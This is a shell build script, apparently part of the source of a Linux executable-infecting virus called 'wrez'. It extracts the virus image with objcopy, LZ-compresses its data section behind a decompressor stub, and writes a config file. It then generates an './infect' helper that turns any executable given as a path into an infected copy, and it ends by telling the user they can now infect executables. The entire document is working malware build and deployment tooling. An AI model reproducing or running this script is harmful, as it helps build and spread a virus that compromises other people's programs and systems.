#!/bin/sh

# later gcc versions (also the 2.95 trunk) changed formatting to 64 bit
cat wrez.map | sed s/0x00000000/0x/g > wrez.map-tmp
mv wrez.map-tmp wrez.map

skip=`cat wrez.map | mawk '
/wrez_init/ { wrez_init = $1; }
/data_start/ { data_start = $1; }
END { print (data_start - wrez_init); }'`

wrcfgrel=`cat wrez.map | mawk '
/wrez_init/ { wrez_init = $1; }
/wrcfg/ { wrcfg = $1; }
END { print (wrcfg - wrez_init); }'`

echo uncompressed data starts at +$skip
echo wrconfig structure at +$wrcfgrel

rm -f wrez.bin
cp wrez wrez.bin
echo extracting virus image to wrez.bin
objcopy -j .text -O binary wrez.bin

echo extracting data to compress to wrez.2nd
rm -f wrez.2nd
dd bs=1 if=wrez.bin of=wrez.2nd skip=$skip

echo compressing wrez.2nd to wrez.2nd.compressed
lzstuff=`./compressor -s wrez.2nd wrez.2nd.compressed`
echo === LZ information: $lzstuff

echo joining the decompressor and the compressed data to wrez.bin.out
rm -f wrez.bin.out
dd bs=1 if=wrez.bin of=wrez.bin.out count=$skip
dd bs=1 if=wrez.2nd.compressed of=wrez.bin.out seek=$skip

echo infecting first victim file
#rm -f victim
#cp `which date` victim.clean
#cp victim.clean victim
echo
echo -n "### final virus size: "
ls -l wrez.bin.out | awk '{ print $5 }'
echo

echo building configuration file
rm -f wrez.bin.conf
cat > wrez.bin.conf << __EOF__
configrel $wrcfgrel
skip $skip
compress $lzstuff
__EOF__

echo building ./infect script
rm -f infect
cat > infect << __EOF__
#!/bin/sh

if [ \$# != 1 ]; then
	echo "usage: \$0 pathname"
	echo
	exit
fi
cp \$1 victim
./initial victim
mv victim \$1.infected
ls -l \$1 \$1.infected
__EOF__
chmod 700 ./infect
echo
echo "### done, you can infect executeable with \"./infect pathname\" now"
echo

